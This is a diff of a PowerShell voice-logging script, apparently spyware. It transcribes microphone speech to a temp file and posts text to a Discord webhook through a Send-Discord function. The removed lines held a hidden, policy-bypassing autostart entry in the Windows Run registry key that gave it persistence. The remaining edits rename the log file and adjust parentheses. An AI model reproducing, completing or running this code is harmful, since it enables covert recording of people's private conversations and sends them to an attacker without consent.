@@ -15,13 +15,6 @@ function Send-Discord {
 	if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType "Application/Json" -Uri $Hook  -Method Post -Body ($Body | ConvertTo-Json) };
 }
 
-if(($Persistent -eq $true)){
-    $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + '$DaysRun=' + $DaysRun + ';Get-Item voicelog.ps1 | Invoke-Expression;sleep 5;exit'); 
-    New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'voicelog' -Value $autostart;
-}elseif(Test-Path -Path "$env:temp\voicelog.ps1" -PathType Leaf){
-    Remove-Item "$env:temp\voicelog.ps1" -Force;
-}
-
 if($DaysRun -eq -1 -or $DaysRun -gt 0){
     if(Test-Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\voicelog'){ return };
 
@@ -38,7 +31,7 @@ if($DaysRun -eq -1 -or $DaysRun -gt 0){
 
 if($DaysRun -gt 0){
     $date = Get-Date;
-    $targetValue = Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\voicelog' -Name 'date';
+    $targetValue = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\voicelog' -Name 'date');
     $targetDate = [DateTime]$targetValue.date;
 
     if($date -lt $targetDate){ return }
@@ -59,7 +52,7 @@ while ($true) {
     $result = $recognizer.Recognize();
     if ($result) {
         $results = $result.Text;
-        $log = ("$env:tmp\vlog.txt");
+        $log = ("$env:tmp\voicelog.txt");
 
         Write-Output $results > $log;
 
